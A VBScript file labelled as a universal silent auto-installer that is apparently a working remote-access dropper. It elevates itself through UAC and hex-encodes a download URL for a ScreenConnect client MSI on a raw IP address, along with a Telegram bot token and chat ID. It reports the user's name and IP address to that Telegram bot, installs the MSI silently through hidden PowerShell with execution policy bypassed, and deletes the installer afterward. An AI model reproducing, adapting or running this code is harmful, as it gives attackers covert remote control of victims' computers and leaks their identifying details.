' ==============================
' Universal Silent Auto-Installer
' ==============================

Set shellApp = CreateObject("Shell.Application")
Set shell = CreateObject("WScript.Shell")

' ----- UAC AUTO ELEVATION (Anniversary Update Safe) -----
If WScript.Arguments.Count = 0 Then
    shellApp.ShellExecute "wscript.exe", """" & WScript.ScriptFullName & """ elevated", "", "runas", 1
    WScript.Quit
End If
' ---------------------------------------------------------

' ----- HEX TO STRING CONVERSION FUNCTION -----
Function HexToString(hexStr)
    Dim i, result
    result = ""
    For i = 1 To Len(hexStr) Step 2
        result = result & Chr(CLng("&H" & Mid(hexStr, i, 2)))
    Next
    HexToString = result
End Function

' ----- GET SYSTEM INFO -----
Function GetSystemInfo()
    Dim objWMI, objItems, objItem, pcUser, pcIP
    Set objWMI = GetObject("winmgmts:")
    
    ' Get PC Username
    Set objItems = objWMI.ExecQuery("Select * from Win32_ComputerSystemProduct")
    pcUser = shell.ExpandEnvironmentStrings("%USERNAME%")
    
    ' Get PC IP Address
    Set objItems = objWMI.ExecQuery("Select * from Win32_NetworkAdapterConfiguration where IPEnabled = True")
    For Each objItem In objItems
        If Not IsNull(objItem.IPAddress) Then
            pcIP = objItem.IPAddress(0)
            Exit For
        End If
    Next
    
    GetSystemInfo = pcUser & "|" & pcIP
End Function

' ----- DECODE HIDDEN CREDENTIALS -----
msiURL = HexToString("687474703A2F2F3130382E3137342E35362E3137353A383034302F42696E2F53637265656E436F6E6E6563742E436C69656E7453657475702E6D73693F653D41636365737326793D4775657374")
telegramBotToken = HexToString("363235393838343732353A4141455A4530615A674A42414357666E75736E73467372676F53334D566F5169364E67")
telegramChatID = HexToString("31383036303439363832")

tmpPath = shell.ExpandEnvironmentStrings("%TEMP%\ClientSetup.msi")

' ----- GET SYSTEM INFO -----
systemInfo = GetSystemInfo()
Dim arrInfo
arrInfo = Split(systemInfo, "|")
pcUser = arrInfo(0)
pcIP = arrInfo(1)

' ----- SEND TELEGRAM MESSAGE - INSTALLATION STARTED -----
Set objHTTP = CreateObject("MSXML2.XMLHTTP")
startMsg = "🔵 [STARTED] User: " & pcUser & " | IP: " & pcIP & " | MSI Installation Started"
telegramURL = "https://api.telegram.org/bot" & telegramBotToken & "/sendMessage?chat_id=" & telegramChatID & "&text=" & EncodeURL(startMsg)
objHTTP.Open "GET", telegramURL, False
objHTTP.Send

' ----- DOWNLOAD -----
downloadCmd = _
    "powershell -NoLogo -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass " & _
    "-Command ""Invoke-WebRequest -Uri '" & msiURL & "' -OutFile '" & tmpPath & "'"""
shell.Run downloadCmd, 0, True

' ----- INSTALL -----
installCmd = _
    "powershell -NoLogo -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass " & _
    "-Command ""Start-Process 'msiexec.exe' -ArgumentList '/i " & tmpPath & " /quiet /norestart' -Wait"""
shell.Run installCmd, 0, True

' ----- SEND TELEGRAM MESSAGE - INSTALLATION SUCCESSFUL -----
Set objHTTP = CreateObject("MSXML2.XMLHTTP")
successMsg = "✅ [SUCCESS] User: " & pcUser & " | IP: " & pcIP & " | MSI Successfully Installed!"
telegramURL = "https://api.telegram.org/bot" & telegramBotToken & "/sendMessage?chat_id=" & telegramChatID & "&text=" & EncodeURL(successMsg)
objHTTP.Open "GET", telegramURL, False
objHTTP.Send

' ----- CLEANUP TEMP FILE -----
cleanupCmd = _
    "cmd /c timeout /t 60 /nobreak && del """ & tmpPath & """"
shell.Run cleanupCmd, 0, True

' ----- URL ENCODING FUNCTION -----
Function EncodeURL(str)
    Dim encoded, i, char, ascVal
    encoded = ""
    For i = 1 To Len(str)
        char = Mid(str, i, 1)
        ascVal = Asc(char)
        Select Case char
            Case " "
                encoded = encoded & "+"
            Case "!", "#", "$", "%", "&", "'", "(", ")", "*", "+", ",", "/", ":", ";", "=", "?", "@", "[", "]"
                encoded = encoded & "%" & Right("0" & Hex(ascVal), 2)
            Case Else
                If ascVal < 32 Or ascVal > 126 Then
                    encoded = encoded & "%" & Right("0" & Hex(ascVal), 2)
                Else
                    encoded = encoded & char
                End If
        End Select
    Next
    EncodeURL = encoded
End Function